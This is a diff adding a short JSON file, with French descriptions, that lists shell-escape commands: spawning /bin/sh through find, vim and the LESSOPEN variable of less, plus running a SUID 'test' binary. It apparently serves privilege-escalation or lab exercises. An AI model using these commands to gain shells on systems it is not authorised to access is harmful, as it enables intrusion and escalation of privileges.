@@ -1,0 +1,19 @@
+{
+  "find": {
+    "description": "Utiliser 'find' pour obtenir un shell",
+    "command": "find . -exec /bin/sh \\; -quit"
+  },
+  "vim": {
+    "description": "Utiliser 'vim' pour exécuter un shell",
+    "command": "vim -c ':!sh'"
+  },
+  "less": {
+    "description": "Exécute un shell en abusant de LESSOPEN",
+    "command": "LESSOPEN='|/bin/sh' less /etc/profile"
+  },
+  
+  "test": {
+    "description": "Exécute le binaire test (SUID)",
+    "command": "/usr/local/bin/test"
+  }
+}
